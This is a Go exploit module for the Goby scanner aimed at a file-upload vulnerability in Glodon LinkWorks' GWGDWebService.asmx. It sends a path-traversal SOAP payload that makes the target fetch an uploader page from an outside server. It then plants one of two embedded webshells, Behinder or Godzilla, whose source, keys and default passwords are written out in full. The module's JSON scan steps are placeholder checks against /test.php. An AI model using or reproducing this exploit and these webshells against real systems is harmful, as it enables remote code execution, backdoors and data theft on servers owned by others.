package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Glodon linkworks GB/LK/ArchiveManagement/Js/GWGDWebService.asmx file upload vulnerability",
    "Description": "<p>Glodon LinkWorks (also known as GlinkLink or GTP-LinkWorks) is a BIM (Building Information Modeling) collaboration platform developed by Glodon. Glodon is one of the leading digital construction technology providers in China, focusing on providing digital solutions for the architecture, engineering and architectural design industries.</p><p>Attackers upload malicious files through this vulnerability, which may lead to problems such as malicious code execution, identity forgery, backdoor implantation, and sensitive data leakage.</p>",
    "Product": "Glodon-LinkWorks",
    "Homepage": "http://www.glinkworks.com/office.html",
    "DisclosureDate": "2023-08-15",
    "PostTime": "2023-08-17",
    "Author": "1691834629@qq.com",
    "FofaQuery": "body=\"Services/Identification/login.ashx\" || header=\"Services/Identification/login.ashx\" || banner=\"Services/Identification/login.ashx\"",
    "GobyQuery": "body=\"Services/Identification/login.ashx\" || header=\"Services/Identification/login.ashx\" || banner=\"Services/Identification/login.ashx\"",
    "Level": "3",
    "Impact": "<p>Attackers upload malicious files through this vulnerability, which may lead to problems such as malicious code execution, identity forgery, backdoor implantation, and sensitive data leakage.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability temporarily, please contact the manufacturer to fix the vulnerability: <a href=\"http://www.glinkworks.com/office.html\">http://www.glinkworks.com/office.html</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test.txt",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "test",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "广联达 linkworks GB/LK/ArchiveManagement/Js/GWGDWebService.asmx 文件上传漏洞",
            "Product": "广联达-LinkWorks",
            "Description": "<p>广联达 LinkWorks（也称为 GlinkLink 或 GTP-LinkWorks）是广联达公司（Glodon）开发的一种BIM（建筑信息模型）协同平台。广联达是中国领先的数字建造技术提供商之一，专注于为建筑、工程和建筑设计行业提供数字化解决方案。<br></p><p>攻击者通过该漏洞上传恶意文件，可能导致恶意代码执行、身份伪造、后门植入、敏感数据泄露等问题。<br></p>",
            "Recommendation": "<p>1、官方暂已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.glinkworks.com/office.html\" target=\"_blank\">http://www.glinkworks.com/office.html</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者通过该漏洞上传恶意文件，可能导致恶意代码执行、身份伪造、后门植入、敏感数据泄露等问题。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Glodon linkworks GB/LK/ArchiveManagement/Js/GWGDWebService.asmx file upload vulnerability",
            "Product": "Glodon-LinkWorks",
            "Description": "<p>Glodon LinkWorks (also known as GlinkLink or GTP-LinkWorks) is a BIM (Building Information Modeling) collaboration platform developed by Glodon. Glodon is one of the leading digital construction technology providers in China, focusing on providing digital solutions for the architecture, engineering and architectural design industries.</p><p>Attackers upload malicious files through this vulnerability, which may lead to problems such as malicious code execution, identity forgery, backdoor implantation, and sensitive data leakage.</p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability temporarily, please contact the manufacturer to fix the vulnerability: <a href=\"http://www.glinkworks.com/office.html\" target=\"_blank\">http://www.glinkworks.com/office.html</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p>Attackers upload malicious files through this vulnerability, which may lead to problems such as malicious code execution, identity forgery, backdoor implantation, and sensitive data leakage.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10825"
}`
	uploadWebshell9023kaljnwaek := func(hostInfo *httpclient.FixUrl, url, param string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig(url)
		cfg.Data = param
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		return resp, err
	}

	checkFileFlag := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		if !strings.HasPrefix(uri, `/`) {
			uri = `/` + uri
		}
		checkRequestConfig := httpclient.NewGetRequestConfig(uri)
		checkRequestConfig.VerifyTls = false
		checkRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, checkRequestConfig)
	}

	sendPayloadFlag := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		if !strings.HasSuffix(filename, ".aspx") {
			filename += ".aspx"
		}
		payloadRequestConfig := httpclient.NewPostRequestConfig(`/GB/LK/ArchiveManagement/Js/GWGDWebService.asmx`)
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.Header.Store("Content-Type", "text/xml; charset=utf-8")
		fileUploadDownUrl := godclient.GodServerAddr
		if !strings.HasPrefix(godclient.GodServerAddr, "http") {
			fileUploadDownUrl = "http://" + godclient.GodServerAddr
		}
		if !strings.HasSuffix(fileUploadDownUrl, "/") {
			fileUploadDownUrl += "/"
		}
		fileUploadDownUrl += `ps/aspx/upload.aspx`
		payloadRequestConfig.Data = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:GetGWGDData>\n         <!--Optional:-->\n         <tem:data>\n            <root>\n               <GWINFO>\n                  <公文标题>1</公文标题>\n                  <拟稿人>拟稿人</拟稿人>\n                  <主送单位>主送单位</主送单位>\n                  <主题词>主题词</主题词>\n                  <印发份数>1</印发份数>\n                  <签发日期>2022-12-07</签发日期>\n               </GWINFO>\n               <aa>\n                  <FileName>./../../../../../../../applications/gtp-default/Web/Common/" + filename + "</FileName>\n                  <DownLoadURL>" + fileUploadDownUrl + "</DownLoadURL>\n               </aa>\n            </root>\n         </tem:data>\n      </tem:GetGWGDData>\n   </soapenv:Body>\n</soapenv:Envelope>\n"
		_, err := httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
		if err != nil {
			return nil, err
		}
		return checkFileFlag(hostInfo, "/Common/"+filename)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, err := sendPayloadFlag(hostInfo, goutils.RandomHexString(6))
			if err != nil {
				return false
			}
			if rsp.StatusCode != 200 {
				return false
			}
			checkToken := goutils.RandomHexString(16)
			filename := goutils.RandomHexString(16) + ".txt"
			rsp, _ = uploadWebshell9023kaljnwaek(hostInfo, rsp.Request.URL.Path, `path=`+filename+`&content=123&token=`+checkToken)
			return rsp != nil && strings.Contains(rsp.Utf8Html, checkToken)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType != "webshell" && attackType != "custom" {
				expResult.Success = false
				expResult.Output = "未知对利用方式"
				return expResult
			}
			filename := goutils.B2S(ss.Params["filename"])
			content := goutils.B2S(ss.Params["content"])
			uploadFileUri := goutils.RandomHexString(16) + ".aspx"
			_, err := sendPayloadFlag(expResult.HostInfo, uploadFileUri)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			randToken := goutils.RandomHexString(6)
			webshell := goutils.B2S(ss.Params["webshell"])
			if attackType == "webshell" {
				filename = goutils.RandomHexString(16) + ".aspx"
				if webshell == "behinder" {
					// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","e45e329feb5d925b");byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%@ Page Language="C#"%><%try { string key = "3c6e0b8a9c15224a"; string pass = "pass"; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", ""); byte[] data = System.Convert.FromBase64String(Context.Request[pass]); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Context.Session["payload"] == null) { Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data }); ; } else { System.IO.MemoryStream outStream = new System.IO.MemoryStream(); object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY"); o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16)); } } catch (System.Exception) { }
%>`
				}
			}
			param := "path=" + filename + "&content=" + url.QueryEscape(content) + "&token=" + randToken
			resp, err := uploadWebshell9023kaljnwaek(expResult.HostInfo, "/Common/"+uploadFileUri, param)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			if resp.StatusCode != 200 && !strings.Contains(resp.RawBody, randToken) {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			if attackType == "custom" {
				expResult.Output += "URL: " + expResult.HostInfo.FixedHostInfo + "/Common/" + filename + "\n"
			} else {
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/Common/" + filename + "\n"
				if webshell == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if webshell == "godzilla" {
					expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
			}
			return expResult
		},
	))
}
